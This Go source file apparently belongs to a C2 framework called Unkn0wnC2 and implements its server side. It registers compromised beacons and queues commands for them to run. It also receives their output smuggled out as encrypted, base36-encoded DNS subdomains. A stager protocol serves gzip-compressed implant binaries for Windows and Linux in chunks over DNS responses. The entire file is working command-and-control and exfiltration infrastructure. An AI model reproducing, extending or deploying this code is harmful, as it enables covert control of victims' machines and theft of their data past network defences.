// Package main implements the C2 management functionality for the Unkn0wnC2 server.
// This file handles beacon registration, task queuing, result collection, and
// the core C2 protocol logic including chunked data transmission.
package main

import (
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"fmt"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

const (
	// Task ID numbering
	taskCounterStart = 1000

	// Subdomain analysis constants
	legitimateSubdomainMaxLength = 20
	base36MinLength              = 30
	base36LongStringThreshold    = 50

	// Timestamp validation
	unixTimestampMinLength = 10
	unixTimestampMaxLength = 11

	// Result preview settings
	resultPreviewMaxLength = 200
)

// Beacon represents a connected beacon client
type Beacon struct {
	ID        string    `json:"id"`
	Hostname  string    `json:"hostname"`
	Username  string    `json:"username"`
	OS        string    `json:"os"`
	Arch      string    `json:"arch"`
	LastSeen  time.Time `json:"last_seen"`
	IPAddress string    `json:"ip_address"`
	TaskQueue []Task    `json:"-"` // Don't serialize tasks
}

// Task represents a command task for a beacon
type Task struct {
	ID        string     `json:"id"`
	BeaconID  string     `json:"beacon_id"`
	Command   string     `json:"command"`
	Status    string     `json:"status"` // "pending", "sent", "completed", "failed"
	CreatedAt time.Time  `json:"created_at"`
	SentAt    *time.Time `json:"sent_at,omitempty"`
	Result    string     `json:"result,omitempty"`
}

// ResultChunk represents a piece of a multi-part result
type ResultChunk struct {
	BeaconID    string
	TaskID      string
	ChunkIndex  int
	TotalChunks int
	Data        string
	ReceivedAt  time.Time
}

// ExpectedResult tracks metadata for incoming chunked results
type ExpectedResult struct {
	BeaconID     string
	TaskID       string
	TotalSize    int
	TotalChunks  int
	ReceivedAt   time.Time
	ReceivedData []string // Store chunks in order
}

// StagerSession tracks an active stager download session
type StagerSession struct {
	IP          string
	OS          string
	Arch        string
	ClientPath  string // Path to the client binary to send
	Chunks      []string
	TotalChunks int
	CreatedAt   time.Time
}

// C2Manager handles beacon management and tasking
type C2Manager struct {
	beacons         map[string]*Beacon
	tasks           map[string]*Task
	resultChunks    map[string][]ResultChunk   // key: taskID (legacy)
	expectedResults map[string]*ExpectedResult // key: taskID (new two-phase)
	stagerSessions  map[string]*StagerSession  // key: clientIP (stager support)
	mutex           sync.RWMutex
	taskCounter     int
	debug           bool
	aesKey          []byte
}

// NewC2Manager creates a new C2 management instance with the specified configuration.
// It initializes the beacon tracking system, task management, and sets up AES encryption.
func NewC2Manager(debug bool, encryptionKey string) *C2Manager {
	aesKey := generateAESKey(encryptionKey)

	return &C2Manager{
		beacons:         make(map[string]*Beacon),
		tasks:           make(map[string]*Task),
		resultChunks:    make(map[string][]ResultChunk),
		expectedResults: make(map[string]*ExpectedResult),
		stagerSessions:  make(map[string]*StagerSession),
		taskCounter:     taskCounterStart,
		debug:           debug,
		aesKey:          aesKey,
	}
}

// decodeBeaconData decodes and decrypts beacon data using AES-GCM + base36
func (c2 *C2Manager) decodeBeaconData(encoded string) (string, error) {
	// Remove dots from DNS labels (e.g., "abc.def" -> "abcdef")
	// This handles long subdomains that get split into multiple labels
	encoded = strings.ReplaceAll(encoded, ".", "")

	// Use new base36 + AES-GCM decoding
	decoded, err := decodeAndDecrypt(encoded, c2.aesKey)
	if err != nil {
		return "", fmt.Errorf("failed to decode and decrypt: %v", err)
	}

	return decoded, nil
}

// isLegitimateSubdomain checks if a subdomain looks like a legitimate DNS name
// rather than encoded C2 data
// isLegitimateSubdomain determines if a DNS subdomain represents legitimate traffic
// rather than encoded C2 communications based on pattern analysis.
func isLegitimateSubdomain(subdomain string) bool {
	// Convert to lowercase for comparison
	lower := strings.ToLower(subdomain)

	// Common legitimate subdomains
	legitimate := []string{
		"ns1", "ns2", "ns3", "ns4",
		"www", "mail", "mx", "mx1", "mx2",
		"ftp", "smtp", "pop", "imap",
		"api", "cdn", "static", "img", "images",
		"blog", "shop", "store", "admin",
		"test", "dev", "staging", "beta",
	}

	for _, legit := range legitimate {
		if lower == legit {
			return true
		}
	}

	// If subdomain is very short (likely legitimate)
	if len(subdomain) <= 4 {
		return true
	}

	// If subdomain contains only letters and numbers with dashes (no base36-like pattern)
	// and is reasonably short, it's probably legitimate
	if len(subdomain) <= legitimateSubdomainMaxLength && !looksLikeBase36(subdomain) {
		return true
	}

	return false
}

// looksLikeBase36 checks if a string looks like base36-encoded C2 data
// looksLikeBase36 analyzes a string to determine if it appears to be Base36-encoded data
// based on length, character distribution, and entropy characteristics.
func looksLikeBase36(s string) bool {
	// Remove any dots (from split labels)
	clean := strings.ReplaceAll(s, ".", "")

	// Must be reasonably long to be encoded data (base36 encoded AES-GCM data is typically long)
	if len(clean) < base36MinLength {
		return false
	}

	// Check if all characters are valid base36 digits (0-9, a-z)
	for _, char := range clean {
		if !((char >= '0' && char <= '9') ||
			(char >= 'a' && char <= 'z')) {
			return false
		}
	}

	// Additional heuristics for base36 encoded data:
	// - Very long strings are likely encoded data
	// - High entropy (good mix of numbers and letters) suggests encoding
	if len(clean) > base36LongStringThreshold {
		return true
	}

	// Check for good entropy (mix of numbers and letters)
	hasNumbers := false
	hasLetters := false
	for _, char := range clean {
		if char >= '0' && char <= '9' {
			hasNumbers = true
		}
		if char >= 'a' && char <= 'z' {
			hasLetters = true
		}
		if hasNumbers && hasLetters {
			break
		}
	}

	// If it has both numbers and letters and is reasonably long, it's likely base36 data
	return hasNumbers && hasLetters && len(clean) >= base36MinLength
}

// processBeaconQuery processes a DNS query from a beacon and returns appropriate response
func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, bool) {
	c2.mutex.Lock()
	defer c2.mutex.Unlock()

	// Quick filter: only process queries to secwolf.net
	if !strings.HasSuffix(qname, "secwolf.net") {
		return "", false
	}

	// Extract subdomain before "secwolf.net"
	secwolfPos := strings.Index(qname, "secwolf.net")
	if secwolfPos == -1 {
		return "", false
	}

	subdomain := strings.TrimRight(qname[:secwolfPos], ".")
	if len(subdomain) == 0 {
		return "", false
	}

	// For C2 traffic, subdomain format is: <encoded_data>.<timestamp>.secwolf.net
	// We need to extract just the encoded data part (first label)
	parts := strings.Split(subdomain, ".")
	if len(parts) == 0 {
		return "", false
	}

	// The encoded message is in the first part, timestamp is in the second
	encodedMessage := parts[0]

	logf("[DEBUG] Processing subdomain: %s, extracted message: %s", subdomain, encodedMessage)

	// Skip legitimate DNS names (NS, MX, WWW, etc.)
	if isLegitimateSubdomain(encodedMessage) {
		return "", false
	}

	// Must look like base36 encoding (for beacons)
	// We allow shorter messages for stagers since they use simple base36 without encryption
	isLikelyBase36 := looksLikeBase36(encodedMessage)
	isShortMessage := len(encodedMessage) < 100

	logf("[DEBUG] isLikelyBase36=%v, isShortMessage=%v, len=%d", isLikelyBase36, isShortMessage, len(encodedMessage))

	// Try to decode as stager message first (base36 only, no encryption)
	// Stager messages are shorter and don't use encryption
	if isShortMessage || isLikelyBase36 {
		plaintext, err := base36DecodeString(encodedMessage)
		if err == nil {
			logf("[DEBUG] Base36 decoded: %s (checking for stager)", plaintext)
			if strings.HasPrefix(plaintext, "STG|") || strings.HasPrefix(plaintext, "ACK|") {
				// This is a stager message - handle it separately
				messageParts := strings.Split(plaintext, "|")

				// Remove timestamp if present
				if len(messageParts) > 1 {
					lastPart := messageParts[len(messageParts)-1]
					if len(lastPart) >= unixTimestampMinLength && len(lastPart) <= unixTimestampMaxLength {
						if _, tsErr := strconv.ParseInt(lastPart, 10, 64); tsErr == nil {
							plaintext = strings.Join(messageParts[:len(messageParts)-1], "|")
							messageParts = strings.Split(plaintext, "|")
						}
					}
				}

				messageType := messageParts[0]
				switch messageType {
				case "STG":
					if len(messageParts) >= 4 {
						response := c2.handleStagerRequest(messageParts, clientIP)
						logf("[DEBUG] Stager response: %s", response)
						return response, true
					}
				case "ACK":
					// ACK format: ACK|<chunk_index>|<IP>|UNKN0WN
					if len(messageParts) >= 4 && messageParts[3] == "UNKN0WN" {
						response := c2.handleStagerAck(messageParts, clientIP)
						logf("[DEBUG] Stager response: %s", response)
						return response, true
					}
				}
			}
		} else {
			if c2.debug {
				logf("[DEBUG] Base36 decode failed: %v", err)
			}
		}
	}

	// Decode the subdomain as encrypted beacon data
	decoded, err := c2.decodeBeaconData(encodedMessage)
	if err != nil {
		return "", false
	}

	// Strip timestamp from decoded data (cache busting)
	// Format: COMMAND|data|...|timestamp -> COMMAND|data|...
	decodedParts := strings.Split(decoded, "|")
	if len(decodedParts) > 1 {
		// Check if last part is a timestamp (numeric)
		lastPart := decodedParts[len(decodedParts)-1]
		if len(lastPart) >= unixTimestampMinLength && len(lastPart) <= unixTimestampMaxLength { // Unix timestamp length
			if _, err := strconv.ParseInt(lastPart, 10, 64); err == nil {
				// Remove timestamp
				decoded = strings.Join(decodedParts[:len(decodedParts)-1], "|")
			}
		}
	}

	// Determine message type and split into parts appropriately so the result/data
	// payloads (which may contain '|' characters) are preserved in the last part.
	if len(decoded) == 0 {
		return "", false
	}

	messageType := strings.SplitN(decoded, "|", 2)[0]
	switch messageType {
	case "CHECKIN", "CHK":
		parts := strings.SplitN(decoded, "|", 5) // CHK|id|host|user|os
		if len(parts) < 5 {
			return "", false
		}
		return c2.handleCheckin(parts, clientIP), true

	case "RESULT":
		// RESULT|beaconID|taskID|<entire result...>
		parts := strings.SplitN(decoded, "|", 4)
		if len(parts) < 4 {
			return "", false
		}
		return c2.handleResult(parts), true

	case "RESULT_META":
		parts := strings.SplitN(decoded, "|", 5) // RESULT_META|id|task|size|chunks
		if len(parts) < 5 {
			return "", false
		}
		return c2.handleResultMeta(parts), true

	case "DATA":
		// DATA|id|taskID|index|<chunk...>
		parts := strings.SplitN(decoded, "|", 5)
		if len(parts) < 5 {
			return "", false
		}
		return c2.handleData(parts), true

	case "CHUNK": // DEPRECATED: Legacy single-phase chunking, kept for backward compatibility
		parts := strings.SplitN(decoded, "|", 6)
		if len(parts) < 6 {
			return "", false
		}
		return c2.handleChunk(parts), true

	default:
		logf("[C2] Unknown message type: %s", messageType)
		return "", false
	}
}

// handleCheckin processes a beacon check-in
func (c2 *C2Manager) handleCheckin(parts []string, clientIP string) string {
	if len(parts) < 5 {
		return "ERROR"
	}

	beaconID := parts[1]
	hostname := parts[2]
	username := parts[3]
	os := parts[4]
	arch := "unknown" // Architecture removed from client data

	// Update or create beacon
	beacon, exists := c2.beacons[beaconID]
	if !exists {
		beacon = &Beacon{
			ID:        beaconID,
			TaskQueue: []Task{},
		}
		c2.beacons[beaconID] = beacon
		// Always log new beacon registration
		logf("[C2] New beacon: %s (%s@%s) %s/%s from %s", beaconID, username, hostname, os, arch, clientIP)
	}

	// Update beacon info
	beacon.Hostname = hostname
	beacon.Username = username
	beacon.OS = os
	beacon.Arch = arch
	beacon.LastSeen = time.Now()
	beacon.IPAddress = clientIP

	// Only log checkins in debug mode to keep console clean
	if c2.debug {
		logf("[C2] Checkin: %s (%s@%s) from %s",
			beaconID, username, hostname, clientIP)
	}

	// Check if there are pending tasks for this beacon
	if len(beacon.TaskQueue) > 0 {
		task := beacon.TaskQueue[0]
		beacon.TaskQueue = beacon.TaskQueue[1:] // Remove the task from queue

		// Mark task as sent
		if storedTask, exists := c2.tasks[task.ID]; exists {
			storedTask.Status = "sent"
			now := time.Now()
			storedTask.SentAt = &now
		}

		taskResponse := fmt.Sprintf("TASK|%s|%s", task.ID, task.Command)
		logf("[C2] Task %s → %s: %s", task.ID, beaconID, task.Command)
		return taskResponse
	}

	return "ACK" // No tasks available
}

// handleResult processes a command result from a beacon
func (c2 *C2Manager) handleResult(parts []string) string {
	if len(parts) < 4 {
		return "ERROR"
	}

	beaconID := parts[1]
	taskID := parts[2]
	result := parts[3]

	// Log receipt of result (include small preview)
	preview := result
	if len(preview) > resultPreviewMaxLength {
		preview = preview[:resultPreviewMaxLength] + "..."
	}
	logf("[C2] Received RESULT from %s for %s (%d bytes). Preview: %s", beaconID, taskID, len(result), preview)

	// Update task with result
	if task, exists := c2.tasks[taskID]; exists {
		task.Result = result
		task.Status = "completed"
	} else {
		logf("[C2] Warning: Result received for unknown task %s (beacon %s)", taskID, beaconID)
	}

	return "ACK"
}

// handleChunk processes a chunked result from a beacon
func (c2 *C2Manager) handleChunk(parts []string) string {
	if len(parts) < 6 {
		return "ERROR"
	}

	beaconID := parts[1]
	taskID := parts[2]
	chunkIndex, _ := strconv.Atoi(parts[3])
	totalChunks, _ := strconv.Atoi(parts[4])
	data := parts[5]

	// Store the chunk
	chunk := ResultChunk{
		BeaconID:    beaconID,
		TaskID:      taskID,
		ChunkIndex:  chunkIndex,
		TotalChunks: totalChunks,
		Data:        data,
		ReceivedAt:  time.Now(),
	}

	c2.resultChunks[taskID] = append(c2.resultChunks[taskID], chunk)

	// Check if we have all chunks
	chunks := c2.resultChunks[taskID]
	if len(chunks) == totalChunks {
		// Reconstruct the complete result
		result := c2.reconstructResult(chunks)

		// Update the task
		if task, exists := c2.tasks[taskID]; exists {
			task.Result = result
			task.Status = "completed"
			logf("[C2] Result: %s → %s (%d bytes, %d chunks)", beaconID, taskID, len(result), totalChunks)
		}

		// Clean up chunks
		delete(c2.resultChunks, taskID)
	}

	return "ACK"
}

// reconstructResult reconstructs a complete result from chunks
func (c2 *C2Manager) reconstructResult(chunks []ResultChunk) string {
	// Sort chunks by index
	sortedChunks := make([]string, len(chunks))
	for _, chunk := range chunks {
		if chunk.ChunkIndex > 0 && chunk.ChunkIndex <= len(chunks) {
			sortedChunks[chunk.ChunkIndex-1] = chunk.Data
		}
	}

	return strings.Join(sortedChunks, "")
}

// handleResultMeta processes result metadata from beacon (two-phase protocol)
func (c2 *C2Manager) handleResultMeta(parts []string) string {
	if len(parts) < 5 {
		return "ERROR"
	}

	beaconID := parts[1]
	taskID := parts[2]
	totalSize, _ := strconv.Atoi(parts[3])
	totalChunks, _ := strconv.Atoi(parts[4])

	logf("[C2] Expecting chunked result from %s for %s: %d bytes in %d chunks",
		beaconID, taskID, totalSize, totalChunks)

	// Store the expectation
	expected := &ExpectedResult{
		BeaconID:     beaconID,
		TaskID:       taskID,
		TotalSize:    totalSize,
		TotalChunks:  totalChunks,
		ReceivedAt:   time.Now(),
		ReceivedData: make([]string, totalChunks),
	}

	c2.expectedResults[taskID] = expected
	return "ACK"
}

// handleData processes data chunks from beacon (two-phase protocol)
func (c2 *C2Manager) handleData(parts []string) string {
	if len(parts) < 5 {
		return "ERROR"
	}

	beaconID := parts[1]
	taskID := parts[2]
	chunkIndex, _ := strconv.Atoi(parts[3])
	data := parts[4]

	// Check if we're expecting this data
	expected, exists := c2.expectedResults[taskID]
	if !exists {
		logf("[C2] Warning: Received DATA chunk for unknown task %s", taskID)
		return "ERROR"
	}

	// Store the chunk (1-indexed from client, 0-indexed in array)
	if chunkIndex > 0 && chunkIndex <= expected.TotalChunks {
		expected.ReceivedData[chunkIndex-1] = data
	} else {
		logf("[C2] Warning: Invalid chunk index %d for task %s (expected 1-%d)",
			chunkIndex, taskID, expected.TotalChunks)
		return "ERROR"
	}

	// Check if we have all chunks
	complete := true
	receivedCount := 0
	for i := 0; i < expected.TotalChunks; i++ {
		if expected.ReceivedData[i] != "" {
			receivedCount++
		} else {
			complete = false
		}
	}

	if complete {
		// Reconstruct the complete result
		result := strings.Join(expected.ReceivedData, "")

		logf("[C2] Result: %s → %s (%d bytes, %d chunks)", beaconID, taskID, len(result), expected.TotalChunks)

		// Update the task
		if task, exists := c2.tasks[taskID]; exists {
			task.Result = result
			task.Status = "completed"
		}

		// Clean up
		delete(c2.expectedResults, taskID)
	}

	return "ACK"
}

// handleStagerRequest processes a stager initialization request
// STG|IP|OS|ARCH -> META|<total_chunks>
func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string) string {
	if len(parts) < 4 {
		return "ERROR"
	}

	stagerIP := parts[1]
	stagerOS := parts[2]
	stagerArch := parts[3]

	logf("[STAGER] Request from resolver %s for stager at %s (%s/%s)", clientIP, stagerIP, stagerOS, stagerArch)

	// Determine which client binary to send
	clientPath := c2.getClientPath(stagerOS, stagerArch)
	if clientPath == "" {
		logf("[STAGER] ERROR: No suitable client found for %s/%s", stagerOS, stagerArch)
		return "ERROR"
	}

	// Prepare the client binary for staging
	chunks, err := c2.prepareClientForStaging(clientPath)
	if err != nil {
		logf("[STAGER] ERROR: Failed to prepare client: %v", err)
		return "ERROR"
	}

	// Create stager session - keyed by stager's IP, not DNS resolver's IP
	session := &StagerSession{
		IP:          stagerIP,
		OS:          stagerOS,
		Arch:        stagerArch,
		ClientPath:  clientPath,
		Chunks:      chunks,
		TotalChunks: len(chunks),
		CreatedAt:   time.Now(),
	}

	// Key session by stager's IP, not DNS resolver's IP
	c2.stagerSessions[stagerIP] = session

	logf("[STAGER] Prepared %d chunks from %s for %s", len(chunks), clientPath, stagerIP)

	return fmt.Sprintf("META|%d", len(chunks))
}

// handleStagerAck processes stager chunk acknowledgment
// ACK|<chunk_index>|<stager_ip>|UNKN0WN -> CHUNK|<data>
func (c2 *C2Manager) handleStagerAck(parts []string, clientIP string) string {
	if len(parts) < 4 {
		return "ERROR"
	}

	chunkIndex, err := strconv.Atoi(parts[1])
	if err != nil {
		return "ERROR"
	}

	// Extract stager IP from the ACK message (format: ACK|index|IP|UNKN0WN)
	stagerIP := parts[2]

	// Get stager session using the stager's IP, not the DNS resolver's IP
	session, exists := c2.stagerSessions[stagerIP]
	if !exists {
		logf("[STAGER] ERROR: No session found for %s (resolver: %s)", stagerIP, clientIP)
		return "ERROR"
	}

	// Validate chunk index
	if chunkIndex < 0 || chunkIndex >= session.TotalChunks {
		logf("[STAGER] ERROR: Invalid chunk index %d (total: %d)", chunkIndex, session.TotalChunks)
		return "ERROR"
	}

	// Send the requested chunk
	chunk := session.Chunks[chunkIndex]

	if c2.debug {
		logf("[STAGER] Sending chunk %d/%d to %s (%d bytes)",
			chunkIndex+1, session.TotalChunks, stagerIP, len(chunk))
	}

	// Clean up session if this was the last chunk
	if chunkIndex == session.TotalChunks-1 {
		logf("[STAGER] Completed staging to %s (%s/%s)", stagerIP, session.OS, session.Arch)
		delete(c2.stagerSessions, stagerIP)
	}

	return fmt.Sprintf("CHUNK|%s", chunk)
}

// getClientPath determines which client binary to send based on OS and architecture
func (c2 *C2Manager) getClientPath(os, arch string) string {
	// Normalize OS and arch strings
	os = strings.ToLower(os)
	arch = strings.ToLower(arch)

	// Map of OS/arch combinations to client binary paths
	// These paths are relative to the server's working directory
	clientMap := map[string]string{
		"windows/x64":   "build/dns-client-windows.exe",
		"windows/amd64": "build/dns-client-windows.exe",
		"linux/x86_64":  "build/dns-client-linux",
		"linux/amd64":   "build/dns-client-linux",
		"linux/x64":     "build/dns-client-linux",
	}

	key := fmt.Sprintf("%s/%s", os, arch)
	if path, ok := clientMap[key]; ok {
		return path
	}

	// Fallback: try just OS-based match
	for k, v := range clientMap {
		if strings.HasPrefix(k, os+"/") {
			return v
		}
	}

	return ""
}

// prepareClientForStaging reads, compresses, base64 encodes, and chunks the client binary
func (c2 *C2Manager) prepareClientForStaging(clientPath string) ([]string, error) {
	// Read the client binary
	clientData, err := os.ReadFile(clientPath)
	if err != nil {
		return nil, fmt.Errorf("failed to read client binary: %v", err)
	}

	// Compress the client data using gzip
	var compressedBuf bytes.Buffer
	gzipWriter := gzip.NewWriter(&compressedBuf)
	if _, err := gzipWriter.Write(clientData); err != nil {
		return nil, fmt.Errorf("failed to compress client: %v", err)
	}
	if err := gzipWriter.Close(); err != nil {
		return nil, fmt.Errorf("failed to close gzip writer: %v", err)
	}

	compressed := compressedBuf.Bytes()

	// Base64 encode the compressed data
	encoded := base64.StdEncoding.EncodeToString(compressed)

	// Split into chunks - must fit in DNS UDP packets (512 bytes max without EDNS0)
	// CHUNK|<data> format, so data must be small enough to fit in DNS response
	// Using 400 bytes per chunk - larger chunks = fewer requests
	// This balances between DNS packet size limits and download speed
	const chunkSize = 400
	var chunks []string

	for i := 0; i < len(encoded); i += chunkSize {
		end := i + chunkSize
		if end > len(encoded) {
			end = len(encoded)
		}
		chunks = append(chunks, encoded[i:end])
	}

	return chunks, nil
}

// AddTask adds a new task for a specific beacon
func (c2 *C2Manager) AddTask(beaconID, command string) string {
	c2.mutex.Lock()
	defer c2.mutex.Unlock()

	// Generate task ID
	c2.taskCounter++
	taskID := fmt.Sprintf("T%04d", c2.taskCounter)

	task := &Task{
		ID:        taskID,
		BeaconID:  beaconID,
		Command:   command,
		Status:    "pending",
		CreatedAt: time.Now(),
	}

	c2.tasks[taskID] = task

	// Add to beacon's task queue
	if beacon, exists := c2.beacons[beaconID]; exists {
		beacon.TaskQueue = append(beacon.TaskQueue, *task)
		logf("[C2] Added task %s for beacon %s: %s", taskID, beaconID, command)
		return taskID
	}

	logf("[C2] ERROR: Beacon %s not found when adding task %s", beaconID, taskID)
	return ""
}

// GetBeacons returns all registered beacons
func (c2 *C2Manager) GetBeacons() map[string]*Beacon {
	c2.mutex.RLock()
	defer c2.mutex.RUnlock()

	result := make(map[string]*Beacon)
	for id, beacon := range c2.beacons {
		result[id] = beacon
	}
	return result
}

// GetTasks returns all tasks
func (c2 *C2Manager) GetTasks() map[string]*Task {
	c2.mutex.RLock()
	defer c2.mutex.RUnlock()

	result := make(map[string]*Task)
	for id, task := range c2.tasks {
		result[id] = task
	}
	return result
}

// PrintStatus prints the current C2 status
func (c2 *C2Manager) PrintStatus() {
	c2.mutex.RLock()
	defer c2.mutex.RUnlock()

	fmt.Printf("\n=== C2 Status ===\n")
	fmt.Printf("Active Beacons: %d\n", len(c2.beacons))

	for _, beacon := range c2.beacons {
		fmt.Printf("  [%s] %s@%s (%s/%s) - Last seen: %s - Queue: %d tasks\n",
			beacon.ID, beacon.Username, beacon.Hostname, beacon.OS, beacon.Arch,
			beacon.LastSeen.Format("15:04:05"), len(beacon.TaskQueue))
	}

	pendingTasks := 0
	completedTasks := 0
	for _, task := range c2.tasks {
		switch task.Status {
		case "pending", "sent":
			pendingTasks++
		case "completed":
			completedTasks++
		}
	}

	fmt.Printf("Tasks - Pending: %d, Completed: %d\n", pendingTasks, completedTasks)
	fmt.Printf("==================\n")
}
